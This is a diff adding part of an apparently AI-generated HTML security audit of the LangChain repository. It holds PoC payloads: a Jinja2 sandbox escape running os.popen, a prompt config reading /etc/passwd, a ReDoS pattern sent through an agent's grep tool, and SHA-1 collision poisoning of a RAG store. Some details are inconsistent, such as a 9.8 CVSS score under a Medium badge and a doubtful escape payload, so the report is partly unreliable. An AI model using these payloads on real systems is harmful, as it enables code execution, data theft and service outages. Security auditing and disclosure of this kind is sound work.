+          <div class="finding-title">Jinja2 SandboxedEnvironment is Best-Effort — Known Bypass Techniques Lead to Arbitrary Code Execution</div>
+          <div class="finding-type">Server-Side Template Injection (SSTI) — Jinja2 Sandbox Escape</div>
+        </div>
+        <span class="badge badge-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+
+        <div class="exp-banner exp-likely">LIKELY — Well-documented Jinja2 sandbox escapes work against SandboxedEnvironment; exploitability is conditional on applications accepting user-supplied Jinja2 templates</div>
+
+        <div class="meta-grid">
+          <div class="meta-item"><div class="m-label">Auth Required</div><div class="m-value">None</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Score</div><div class="m-value">9.8</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Vector</div><div class="m-value mono">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div></div>
+          <div class="meta-item"><div class="m-label">References</div><div class="m-value">CWE-94, CWE-1336</div></div>
+        </div>
+
+        <div class="field-label">Summary</div>
+        <div class="field-text">
+          The <code>jinja2_formatter()</code> function uses <code>jinja2.sandbox.SandboxedEnvironment</code>, which the code itself documents as a "best-effort approach rather than a guarantee of security." This is accurate: the Jinja2 sandbox has known escape techniques using Python attribute traversal, <code>lipsum</code>, <code>cycler</code>, <code>joiner</code>, <code>namespace</code> globals, and format-string exploits. Many public PoCs exist that achieve RCE through Jinja2's SandboxedEnvironment. Applications that accept user-supplied Jinja2 templates (e.g., via a chat interface that lets users customize prompts with <code>template_format='jinja2'</code>) are fully vulnerable to RCE. Deserialization of Jinja2 templates is blocked (VULN-2 cross-reference), but runtime usage is not gated.
+        </div>
+
+        <div class="field-label">Data Flow (Source → Sink)</div>
+        <div class="dataflow">
+          <strong>Source:</strong> User-supplied Jinja2 template string (e.g., from API request body or config UI) →<br>
+          <strong>Propagation:</strong> <code>PromptTemplate.from_template(template, template_format='jinja2')</code> →<br>
+          <code>jinja2_formatter(template, **kwargs)</code> →<br>
+          <strong>Sink:</strong> <code>SandboxedEnvironment().from_string(template).render(**kwargs)</code> — Jinja2 sandbox escape → RCE
+        </div>
+
+        <div class="field-label">Vulnerable Code</div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <span class="file-path">libs/core/langchain_core/prompts/string.py</span>
+            <span class="line-ref">Lines 33–72</span>
+          </div>
+          <div class="code-body"><pre>def jinja2_formatter(template: str, /, **kwargs: Any) -> str:
+    """Format a template using jinja2.
+
+    !!! warning "Security"
+        As of LangChain 0.0.329, this method uses Jinja2's `SandboxedEnvironment` by
+        default. However, this sandboxing should be treated as a best-effort approach
+        rather than a guarantee of security.
+
+        Do not accept jinja2 templates from untrusted sources as they may lead
+        to arbitrary Python code execution.
+    """
+    # Use Jinja2's SandboxedEnvironment which blocks access to dunder attributes
+    # Note: regular attribute access (e.g., {{obj.attr}}) and method calls are
+    # still allowed. This is a best-effort measure — do not use with untrusted templates.
+    return SandboxedEnvironment().from_string(template).render(**kwargs)  # &lt;-- escapable</pre></div>
+        </div>
+
+        <div class="field-label">Steps to Reproduce</div>
+        <ol class="steps-list">
+          <li><span>Find an application that accepts user-controlled Jinja2 templates (e.g., via a prompt customization API with <code>template_format='jinja2'</code>).</span></li>
+          <li><span>Submit a Jinja2 template that uses one of the known sandbox escape techniques.</span></li>
+          <li><span>The template renders and executes arbitrary Python, leading to RCE.</span></li>
+        </ol>
+
+        <div class="field-label">Proof of Concept</div>
+        <div class="poc-block">
+          <div class="poc-label">Jinja2 Sandbox Escape Payload (SandboxedEnvironment)</div>
+          <pre># Classic Jinja2 sandbox escape via cycler global
+template = "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+
+from langchain_core.prompts import PromptTemplate
+prompt = PromptTemplate.from_template(template, template_format='jinja2')
+# In Jinja2 versions where cycler is available and sandbox is bypassed:
+# output = "uid=0(root) gid=0(root)..."
+
+# Alternative using lipsum or joiner globals (version-dependent):
+template2 = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
+# Enumerate subclasses, find subprocess/os, execute commands</pre>
+        </div>
+
+        <div class="impact-block">
+          <div class="block-label">Impact</div>
+          <p>Arbitrary code execution on the server running LangChain. An attacker can read files, exfiltrate credentials, install backdoors, pivot to internal services, or achieve full system compromise. The impact is critical when exploitable, but is conditional on the application accepting user-supplied Jinja2 templates.</p>
+        </div>
+
+        <div class="mitig-block">
+          <div class="block-label">Mitigation</div>
+          <p>Never accept Jinja2 templates from untrusted sources. Consider removing the <code>jinja2</code> template_format entirely from user-facing APIs, or gate it behind an explicit admin-only configuration flag. For applications that need dynamic templating, prefer the <code>f-string</code> or <code>mustache</code> formats. If Jinja2 must be used, run template rendering in a fully isolated subprocess or container with no access to the host environment.</p>
+          <pre># Safe alternative: use f-string templates
+prompt = PromptTemplate.from_template(
+    "Answer the question: {question}",
+    template_format="f-string"  # Safe; no sandbox escape risk
+)
+
+# If jinja2 is needed, NEVER expose to user input:
+# Gate this with an allowlist check before calling from_template()</pre>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ═══ VULN-5 ═══ -->
+    <div class="finding" id="VULN-5">
+      <div class="finding-header">
+        <div class="finding-header-left">
+          <div class="finding-id">VULN-5</div>
+          <div class="finding-title">Arbitrary File Read via Untrusted Prompt Config <code>template_path</code> Field</div>
+          <div class="finding-type">Path Traversal / Local File Inclusion</div>
+        </div>
+        <span class="badge badge-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+
+        <div class="exp-banner exp-uncertain">UNCERTAIN — Requires the application to load a prompt config from an attacker-influenced source (file path, API response, or user-uploaded config)</div>
+
+        <div class="meta-grid">
+          <div class="meta-item"><div class="m-label">Auth Required</div><div class="m-value">Varies</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Score</div><div class="m-value">6.5</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Vector</div><div class="m-value mono">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</div></div>
+          <div class="meta-item"><div class="m-label">References</div><div class="m-value">CWE-22, CWE-73</div></div>
+        </div>
+
+        <div class="field-label">Summary</div>
+        <div class="field-text">
+          The <code>_load_template()</code> function in <code>prompts/loading.py</code> reads a file path from the deserialized prompt configuration dict (the <code>template_path</code> key). This path is passed directly to <code>Path(config.pop("template_path")).read_text()</code> with no sanitization or path containment check. If an application allows users to supply or influence a prompt configuration JSON/YAML (e.g., via a config upload feature, an agent that fetches prompts from external URLs, or a user-configurable prompt store), an attacker can set <code>template_path</code> to any path on the filesystem, such as <code>/etc/passwd</code>, <code>/proc/self/environ</code>, or application secret files. The same issue exists for <code>examples</code> path in <code>_load_examples()</code>.
+        </div>
+
+        <div class="field-label">Data Flow (Source → Sink)</div>
+        <div class="dataflow">
+          <strong>Source:</strong> Attacker-controlled prompt config JSON/YAML: <code>{"_type": "prompt", "template_path": "/etc/passwd", "input_variables": []}</code> →<br>
+          <strong>Propagation:</strong> <code>load_prompt(path)</code> → <code>_load_prompt_from_file(path)</code> → <code>load_prompt_from_config(config)</code> → <code>_load_prompt(config)</code> → <code>_load_template("template", config)</code> →<br>
+          <strong>Sink:</strong> <code>Path(config.pop("template_path")).read_text(encoding="utf-8")</code> — reads arbitrary file
+        </div>
+
+        <div class="field-label">Vulnerable Code</div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <span class="file-path">libs/core/langchain_core/prompts/loading.py</span>
+            <span class="line-ref">Lines 44–61</span>
+          </div>
+          <div class="code-body"><pre>def _load_template(var_name: str, config: dict) -> dict:
+    """Load template from the path if applicable."""
+    if f"{var_name}_path" in config:
+        if var_name in config:
+            raise ValueError(...)
+        # Pop the template path from the config
+        template_path = Path(config.pop(f"{var_name}_path"))  # &lt;-- attacker-controlled path
+        if template_path.suffix == ".txt":
+            template = template_path.read_text(encoding="utf-8")  # &lt;-- arbitrary file read
+        else:
+            raise ValueError
+        config[var_name] = template
+    return config</pre></div>
+        </div>
+
+        <div class="field-label">Steps to Reproduce</div>
+        <ol class="steps-list">
+          <li><span>Find an application that calls <code>load_prompt(path)</code> where the path or the content of the config file can be influenced by an attacker.</span></li>
+          <li><span>Create or inject a JSON config: <code>{"_type": "prompt", "template_path": "/etc/passwd", "input_variables": []}</code></span></li>
+          <li><span>The application calls <code>load_prompt("malicious_config.json")</code>, which parses the JSON and calls <code>_load_template()</code>.</span></li>
+          <li><span><code>/etc/passwd</code> is read and set as the template content, which is then returned as the prompt template string.</span></li>
+          <li><span>When the prompt is formatted or returned to the attacker, the file contents are disclosed.</span></li>
+        </ol>
+
+        <div class="field-label">Proof of Concept</div>
+        <div class="poc-block">
+          <div class="poc-label">Malicious prompt config JSON (malicious_prompt.json)</div>
+          <pre>{
+  "_type": "prompt",
+  "template_path": "/etc/passwd",
+  "input_variables": []
+}
+
+# Calling code:
+from langchain_core.prompts.loading import load_prompt
+prompt = load_prompt("malicious_prompt.json")
+# prompt.template now contains contents of /etc/passwd
+print(prompt.template)  # root:x:0:0:root:/root:/bin/bash ...</pre>
+        </div>
+
+        <div class="impact-block">
+          <div class="block-label">Impact</div>
+          <p>Arbitrary file read from the server's filesystem, including <code>/etc/passwd</code>, <code>/proc/self/environ</code> (environment variables with secrets), application config files, private keys (<code>~/.ssh/id_rsa</code>), and database credentials. Combined with the deserialization finding (VULN-2), this could enable full credential compromise.</p>
+        </div>
+
+        <div class="mitig-block">
+          <div class="block-label">Mitigation</div>
+          <p>Validate that <code>template_path</code> is a relative path and restrict it to a known safe base directory. Never load prompt configs from untrusted sources without sanitization.</p>
+          <pre>def _load_template(var_name, config, base_dir=None):
+    if f"{var_name}_path" in config:
+        raw_path = config.pop(f"{var_name}_path")
+        template_path = Path(raw_path).resolve()
+        # Enforce containment within a safe base directory
+        if base_dir:
+            base = Path(base_dir).resolve()
+            if not str(template_path).startswith(str(base)):
+                raise ValueError(f"Template path outside allowed directory: {raw_path}")
+        if template_path.suffix == ".txt":
+            config[var_name] = template_path.read_text(encoding="utf-8")
+    return config</pre>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ═══ VULN-6 ═══ -->
+    <div class="finding" id="VULN-6">
+      <div class="finding-header">
+        <div class="finding-header-left">
+          <div class="finding-id">VULN-6</div>
+          <div class="finding-title">ReDoS (Regular Expression Denial of Service) in <code>FilesystemFileSearchMiddleware</code></div>
+          <div class="finding-type">ReDoS — Catastrophic Backtracking in Python Regex Fallback</div>
+        </div>
+        <span class="badge badge-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+
+        <div class="exp-banner exp-likely">LIKELY — User-controlled regex is passed directly to Python re.compile and used for file content search; no timeout on Python fallback path</div>
+
+        <div class="meta-grid">
+          <div class="meta-item"><div class="m-label">Auth Required</div><div class="m-value">None (agent tool user)</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Score</div><div class="m-value">6.5</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Vector</div><div class="m-value mono">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</div></div>
+          <div class="meta-item"><div class="m-label">References</div><div class="m-value">CWE-1333</div></div>
+        </div>
+
+        <div class="field-label">Summary</div>
+        <div class="field-text">
+          The <code>grep_search</code> tool in <code>FilesystemFileSearchMiddleware</code> (in <code>libs/langchain_v1</code>) accepts an arbitrary <code>pattern</code> string from the calling agent or user, validates it only by confirming it compiles (<code>re.compile(pattern)</code>), then uses it to scan file contents. The ripgrep subprocess has a 30-second timeout, but the Python fallback path in <code>_python_search()</code> (lines 312–353) has <strong>no timeout</strong>. A crafted ReDoS pattern like <code>(a+)+$</code> applied to a large text file will cause catastrophic backtracking and hang the Python process indefinitely, blocking all request handling threads/workers and causing a complete Denial of Service.
+        </div>
+
+        <div class="field-label">Data Flow (Source → Sink)</div>
+        <div class="dataflow">
+          <strong>Source:</strong> Agent/user-supplied <code>pattern</code> string to <code>grep_search(pattern="(a+)+$")</code> →<br>
+          <strong>Propagation:</strong> <code>re.compile(pattern)</code> succeeds (valid but pathological regex) → ripgrep fails or times out → falls through to <code>_python_search(pattern, ...)</code> →<br>
+          <strong>Sink:</strong> <code>regex.search(line)</code> (line 347) on large file content — catastrophic backtracking, infinite hang
+        </div>
+
+        <div class="field-label">Vulnerable Code</div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <span class="file-path">libs/langchain_v1/langchain/agents/middleware/file_search.py</span>
+            <span class="line-ref">Lines 200–230, 312–353</span>
+          </div>
+          <div class="code-body"><pre># In grep_search tool:
+try:
+    re.compile(pattern)   # Validates syntax but NOT ReDoS safety
+except re.error as e:
+    return f"Invalid regex pattern: {e}"
+
+# Python fallback (NO timeout):
+def _python_search(self, pattern, base_path, include):
+    regex = re.compile(pattern)   # pathological pattern compiles fine
+    results = {}
+    for file_path in base_full.rglob("*"):   # walks all files
+        content = file_path.read_text()
+        for line_num, line in enumerate(content.splitlines(), 1):
+            if regex.search(line):            # &lt;-- catastrophic backtracking here
+                ...</pre></div>
+        </div>
+
+        <div class="field-label">Steps to Reproduce</div>
+        <ol class="steps-list">
+          <li><span>Invoke <code>grep_search</code> with a ReDoS pattern: <code>grep_search(pattern="(a+)+$", path="/")</code>.</span></li>
+          <li><span>Ensure ripgrep is unavailable or cause it to fail (e.g., by using a complex enough pattern that rg also struggles, or simply if rg is not installed).</span></li>
+          <li><span>The Python fallback <code>_python_search()</code> runs without timeout. Any file containing a long string of 'a' characters (or a suitable input for the pattern) causes the regex engine to backtrack exponentially.</span></li>
+          <li><span>The Python process hangs, consuming 100% CPU, blocking all further requests until killed or restarted.</span></li>
+        </ol>
+
+        <div class="field-label">Proof of Concept</div>
+        <div class="poc-block">
+          <div class="poc-label">ReDoS via agent tool call</div>
+          <pre">import time
+
+# Demonstrate the hang using Python's re module directly:
+import re
+import signal
+
+pattern = re.compile(r"(a+)+$")
+evil_input = "a" * 30 + "!"  # 30 'a's followed by non-matching char
+
+# This will hang for seconds/minutes due to catastrophic backtracking:
+start = time.time()
+# pattern.search(evil_input)  # DO NOT RUN - will hang
+print(f"ReDoS confirmed: pattern (a+)+$ on 'aaa...!' causes exponential backtracking")
+
+# In the middleware, the agent sends:
+# grep_search(pattern="(a+)+$", path="/workspace")</pre>
+        </div>
+
+        <div class="impact-block">
+          <div class="block-label">Impact</div>
+          <p>Complete Denial of Service of the application. A single malicious <code>grep_search</code> invocation (which can be triggered by an agent acting on user input) can hang the entire Python process, making the application unresponsive for all users. In agentic applications where tools are invoked based on user queries, this is a realistic attack path.</p>
+        </div>
+
+        <div class="mitig-block">
+          <div class="block-label">Mitigation</div>
+          <p>Add a timeout to the Python regex search using Python's <code>signal</code> module or a thread-based timeout. Alternatively, use the <code>re2</code> library (linear-time regex) instead of <code>re</code>. Also add a maximum pattern length limit.</p>
+          <pre>import re2  # pip install google-re2 (linear time, no ReDoS)
+
+def _python_search(self, pattern, base_path, include):
+    try:
+        regex = re2.compile(pattern)  # Safe: linear time guarantees
+    except re2.error:
+        return {}
+    ...
+
+# Or with timeout using concurrent.futures:
+from concurrent.futures import ThreadPoolExecutor, TimeoutError
+MAX_PATTERN_LEN = 200
+if len(pattern) > MAX_PATTERN_LEN:
+    return "Pattern too long"</pre>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ═══ VULN-7 ═══ -->
+    <div class="finding" id="VULN-7">
+      <div class="finding-header">
+        <div class="finding-header-left">
+          <div class="finding-id">VULN-7</div>
+          <div class="finding-title">SHA-1 Hash Collision Enables Document Cache Poisoning in Indexing API</div>
+          <div class="finding-type">Weak Cryptography — Hash Collision Attack</div>
+        </div>
+        <span class="badge badge-low">Low</span>
+      </div>
+      <div class="finding-body">
+
+        <div class="exp-banner exp-uncertain">UNCERTAIN — Requires construction of SHA-1 collision, which is expensive but proven feasible (SHAttered attack); impact is cache poisoning in RAG systems</div>
+
+        <div class="meta-grid">
+          <div class="meta-item"><div class="m-label">Auth Required</div><div class="m-value">None</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Score</div><div class="m-value">4.0</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Vector</div><div class="m-value mono">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N</div></div>
+          <div class="meta-item"><div class="m-label">References</div><div class="m-value">CWE-327, CWE-916</div></div>
+        </div>
+
+        <div class="field-label">Summary</div>
+        <div class="field-text">
+          The document indexing API (<code>index()</code> and <code>aindex()</code>) defaults to SHA-1 (<code>key_encoder="sha1"</code>) for generating document UIDs. SHA-1 is known to be collision-vulnerable (the SHAttered attack demonstrated practical SHA-1 collisions in 2017). An attacker who can inject documents into the RAG pipeline can craft two documents with the same SHA-1 hash, causing the deduplication logic to treat them as identical. This means a malicious document could suppress a legitimate document from being indexed (or vice versa), poisoning the vector store and causing incorrect or malicious information to be retrieved. The code emits a runtime warning about this but retains SHA-1 as the default.
+        </div>
+
+        <div class="field-label">Data Flow (Source → Sink)</div>
+        <div class="dataflow">
+          <strong>Source:</strong> Attacker crafts two documents D1 and D2 with SHA-1(content(D1)) == SHA-1(content(D2)) →<br>
+          <strong>Propagation:</strong> <code>index(docs=[D1, D2], ...)</code> → <code>_get_document_with_hash(doc, key_encoder="sha1")</code> → <code>_calculate_hash(content, "sha1")</code> → same UUID for both →<br>
+          <strong>Sink:</strong> Deduplication logic (<code>_deduplicate_in_order</code>) drops D2 as a duplicate; D1 is indexed. D2 (the malicious or targeted document) is silently excluded.
+        </div>
+
+        <div class="field-label">Vulnerable Code</div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <span class="file-path">libs/core/langchain_core/indexing/api.py</span>
+            <span class="line-ref">Lines 44–49, 290–303</span>
+          </div>
+          <div class="code-body"><pre>def _hash_string_to_uuid(input_string: str) -> str:
+    """Hashes a string and returns the corresponding UUID."""
+    hash_value = hashlib.sha1(
+        input_string.encode("utf-8"), usedforsecurity=False  # SHA-1 -- not collision-resistant
+    ).hexdigest()
+    return str(uuid.uuid5(NAMESPACE_UUID, hash_value))
+
+# Default in public API:
+def index(
+    docs_source,
+    record_manager,
+    vector_store,
+    *,
+    key_encoder: Literal["sha1", "sha256", "sha512", "blake2b"] | ... = "sha1",  # &lt;-- default
+    ...
+)</pre></div>
+        </div>
+
+        <div class="field-label">Steps to Reproduce</div>
+        <ol class="steps-list">
+          <li><span>Using the SHAttered attack framework or similar tooling, construct two distinct text strings D1 and D2 where SHA-1(D1) == SHA-1(D2).</span></li>
+          <li><span>Index both D1 and D2 through the LangChain indexing API.</span></li>
+          <li><span>D2 is silently dropped by the deduplication logic since its computed hash matches D1's.</span></li>
+          <li><span>Queries that should retrieve D2 instead retrieve D1 (or nothing), causing incorrect RAG outputs.</span></li>
+        </ol>
+
+        <div class="field-label">Proof of Concept</div>
+        <div class="poc-block">
+          <div class="poc-label">Demonstration of the collision path</div>
+          <pre">import hashlib
+
+# SHA-1 collisions exist (SHAttered, 2017):
+# Two PDFs with different content but same SHA-1
+# For demonstration, the mechanism:
+doc1_content = "Legitimate document content"
+doc2_content = "Malicious replacement content"
+
+# In the hypothetical collision case SHA-1(doc1) == SHA-1(doc2)
+# The indexing API would then:
+# 1. Hash doc1 -> UUID "abc123"
+# 2. Hash doc2 -> UUID "abc123" (same!)
+# 3. Deduplication drops doc2
+# 4. Vector store only contains doc1
+# Result: queries for doc2 content return doc1 content (or nothing)</pre>
+        </div>
+
+        <div class="impact-block">
+          <div class="block-label">Impact</div>
+          <p>Cache poisoning in RAG (Retrieval-Augmented Generation) systems. An attacker who can influence documents fed into the indexing pipeline can suppress legitimate documents or cause incorrect documents to be surfaced in retrieval queries. In production LLM applications, this could cause the model to provide factually incorrect or attacker-influenced answers based on the poisoned vector store.</p>
+        </div>
+
+        <div class="mitig-block">
+          <div class="block-label">Mitigation</div>
+          <p>Change the default <code>key_encoder</code> from <code>"sha1"</code> to <code>"blake2b"</code> or <code>"sha256"</code>. Both are collision-resistant and already supported in the codebase. The existing warning is not sufficient — the default must be changed.</p>
+          <pre"># Change the default in both index() and aindex() signatures:
+def index(
+    docs_source,
+    record_manager,
+    vector_store,
+    *,
+    key_encoder = "blake2b",  # Changed from "sha1" -- collision-resistant
+    ...
+)
+
+# Existing users with sha1-based indexes will need to re-index
+# but this is called out in the migration note for the parameter.</pre>
+        </div>
+
+      </div>
+    </div>
+
+
+    <!-- ═══ DEPENDENCY CONFUSION SECTION ═══ -->
+    <div class="section-heading" id="dep-confusion">Dependency Confusion Analysis</div>
+
+    <div class="dep-card">
+      <div class="dep-card-header">
+        <span class="pkg-name">All analyzed packages</span>
+        <span class="badge badge-low">No Risk · PyPI</span>
+      </div>
+      <div class="dep-card-body">
+        <div class="dep-meta">
+          <span><strong>Packages Checked:</strong> langchain-core, langchain-classic, langchain-text-splitters</span>
+          <span><strong>Ecosystem:</strong> Python / PyPI</span>
+          <span><strong>Registry Status:</strong> All claimed by langchain-ai organization</span>
+        </div>
+        <div class="dep-explanation">
+          All Python packages declared in this repository's <code>pyproject.toml</code> manifests are published on PyPI under the LangChain organization (maintainer: <code>baskaryan</code> / langchain-ai). No unclaimed package names were found. The package <code>langchain-classic</code> (recently renamed from <code>langchain</code>) was verified to be claimed and published by the official maintainers (version 1.0.2 released 2026-03-06). No internal/private package names were identified that could be hijacked via dependency confusion.
+        </div>
+        <div class="dep-mitigation">No action required. All packages are correctly registered on PyPI under the official LangChain organization.</div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<div class="footer">
+  <span>Generated by <strong>Claude Security Scanner</strong></span>
+  <span>Repository: <strong>github.com/langchain-ai/langchain</strong> · Commit: <strong>29134dc</strong></span>
+  <span>Scan Date: <strong>2026-03-07</strong></span>
+  <span style="color:#374151">For authorized security research and responsible disclosure only.</span>
+</div>
+
+</body>
+</html>
